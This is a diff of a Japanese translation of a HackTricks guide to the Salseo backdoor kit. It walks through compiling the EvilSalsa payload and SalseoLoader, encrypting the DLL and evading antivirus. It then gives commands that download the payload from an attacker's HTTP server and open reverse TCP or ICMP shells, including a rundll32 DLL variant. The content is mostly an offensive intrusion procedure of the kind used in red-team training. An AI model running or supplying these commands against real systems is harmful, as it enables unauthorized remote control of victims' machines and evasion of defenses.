@@ -1,32 +1,33 @@
 # Salseo
 
+{% hint style="success" %}
+AWSハッキングの学習と練習：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングの学習と練習：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary>HackTricksのサポート</summary>
 
-HackTricksをサポートする他の方法：
-
-- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
-- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦で**フォロー**する [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
-- **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
+* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、ハッキングトリックを共有してください。
 
 </details>
+{% endhint %}
 
 ## バイナリのコンパイル
 
-GitHubからソースコードをダウンロードし、**EvilSalsa**と**SalseoLoader**をコンパイルします。コードをコンパイルするには**Visual Studio**が必要です。
+Githubからソースコードをダウンロードし、**EvilSalsa**と**SalseoLoader**をコンパイルします。コードをコンパイルするには**Visual Studio**がインストールされている必要があります。
 
 これらのプロジェクトを、使用するWindowsボックスのアーキテクチャ用にコンパイルします（Windowsがx64をサポートしている場合は、そのアーキテクチャ用にコンパイルします）。
 
-Visual Studio内で、**左側の"Build"タブ**内の**"Platform Target"**でアーキテクチャを選択できます。
+Visual Studio内の**左側の"Build"タブ**の**"Platform Target"**でアーキテクチャを選択できます。
 
-（\*\*このオプションが見つからない場合は、**"Project Tab"**をクリックして、次に**"<Project Name> Properties"**をクリックします）
+（\*\*このオプションが見つからない場合は、**"Project Tab"**をクリックしてから**"\<Project Name> Properties"**をクリックします）
 
 ![](<../.gitbook/assets/image (132).png>)
 
-次に、両方のプロジェクトをビルドします（Build -> Build Solution）（ログ内に実行可能ファイルのパスが表示されます）：
+その後、両方のプロジェクトをビルドします（Build -> Build Solution）（ログ内に実行可能ファイルのパスが表示されます）：
 
 ![](<../.gitbook/assets/image (1) (2) (1) (1) (1).png>)
 
@@ -46,11 +47,15 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-## **バックドアの実行**
+Ok, 今、Salseoのすべてを実行するために必要なものが揃いました: **エンコードされたEvilDalsa.dll** と **SalseoLoaderのバイナリ**。
 
-### **TCPリバースシェルの取得（HTTPを介してエンコードされたdllをダウンロードする）**
+**SalseoLoader.exeバイナリをマシンにアップロードしてください。どのAVにも検出されないようにしてください...**
 
-リバースシェルリスナーとHTTPサーバーを起動して、エンコードされたEvilDalsa.dllを提供することを忘れないでください。
+## **バックドアを実行する**
+
+### **TCPリバースシェルを取得する（HTTPを介してエンコードされたdllをダウンロードする）**
+
+リバースシェルリスナーとHTTPサーバーを起動して、エンコードされたevilsalsaを提供することを忘れないでください。
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -75,63 +80,63 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-#### 被害者の内部で、salseoの操作を実行します：
+#### 被害者の内部で、salseoのことを実行しましょう：
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
-## DLLエクスポートメイン関数としてSalseoLoaderをコンパイルする
+## DLLのエクスポートメイン関数としてSalseoLoaderをコンパイルする
 
 Visual Studioを使用してSalseoLoaderプロジェクトを開きます。
 
 ### メイン関数の前に追加: \[DllExport]
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### このプロジェクトにDllExportをインストール
 
-#### **ツール** --> **NuGetパッケージマネージャ** --> **ソリューションのNuGetパッケージを管理...**
+#### **ツール** --> **NuGet パッケージ マネージャー** --> **ソリューションの NuGet パッケージを管理...**
 
 ![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **DllExportパッケージを検索（ブラウズタブを使用）し、インストールを押して（ポップアップを受け入れて）**
+#### **DllExport パッケージを検索 (Browse タブを使用) し、インストールを押して (ポップアップを受け入れる)**
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-プロジェクトフォルダに**DllExport.bat**と**DllExport\_Configure.bat**というファイルが表示されます
+プロジェクトフォルダに **DllExport.bat** と **DllExport\_Configure.bat** というファイルが表示されます
 
 ### DllExportをアンインストール
 
-**アンインストール**を押します（はい、奇妙ですが、信じてください、必要です）
+**アンインストール** を押します (はい、奇妙ですが、信じてください、必要です)
 
 ![](<../.gitbook/assets/image (5) (1) (1) (2) (1).png>)
 
 ### Visual Studioを終了し、DllExport\_configureを実行
 
-Visual Studioを**終了**します
+単に Visual Studio を **終了** します
 
-その後、**SalseoLoaderフォルダ**に移動し、**DllExport\_Configure.bat**を実行します
+その後、**SalseoLoaderフォルダ**に移動し、**DllExport\_Configure.bat** を実行します
 
-**x64**を選択します（x64ボックス内で使用する場合、私の場合はそうでした）、**System.Runtime.InteropServices**（**DllExportのNamespace**内）を選択し、**Apply**を押します
+**x64** を選択します (x64ボックス内で使用する場合、私の場合はそうでした)、**System.Runtime.InteropServices** (DllExportの**Namespace**内) を選択し、**Apply** を押します
 
 ![](<../.gitbook/assets/image (7) (1) (1) (1) (1).png>)
 
 ### プロジェクトを再度Visual Studioで開く
 
-**\[DllExport]**はもはやエラーとしてマークされていません
+**\[DllExport]** はもはやエラーとしてマークされていません
 
 ![](<../.gitbook/assets/image (8) (1).png>)
 
 ### ソリューションをビルド
 
-**Output Type = Class Library**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> アプリケーション --> Output type = Class Library）
+**Output Type = Class Library** を選択します (プロジェクト --> SalseoLoader プロパティ --> アプリケーション --> Output type = Class Library)
 
 ![](<../.gitbook/assets/image (10) (1).png>)
 
-**x64プラットフォーム**を選択します（プロジェクト --> SalseoLoaderのプロパティ --> ビルド --> Platform target = x64）
+**x64プラットフォーム** を選択します (プロジェクト --> SalseoLoader プロパティ --> ビルド --> Platform target = x64)
 
 ![](<../.gitbook/assets/image (9) (1) (1).png>)
 
-ソリューションを**ビルド**するには: Build --> Build Solution（出力コンソール内に新しいDLLのパスが表示されます）
+ソリューションを**ビルド**するには: Build --> Build Solution (Outputコンソール内に新しいDLLのパスが表示されます)
 
 ### 生成されたDllをテスト
 
@@ -145,7 +150,7 @@ rundll32.exe SalseoLoader.dll,main
 
 ## DLLを使用してシェルを取得する
 
-**HTTPサーバー**を使用して**ncリスナー**を設定することを忘れないでください
+**HTTP** **サーバー**を使用して、**nc** **リスナー**を設定することを忘れないでください
 
 ### Powershell
 ```
@@ -167,16 +172,17 @@ set lport=1337
 set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
+{% hint style="success" %}
+AWSハッキングの学習と練習:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングの学習と練習: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を使用して、ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
+<summary>HackTricksのサポート</summary>
 
-HackTricks をサポートする他の方法:
-
-* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f)または [**telegram グループ**](https://t.me/peass) に**参加**するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)を**フォロー**する
-* **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
+* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
 
 </details>
+{% endhint %}
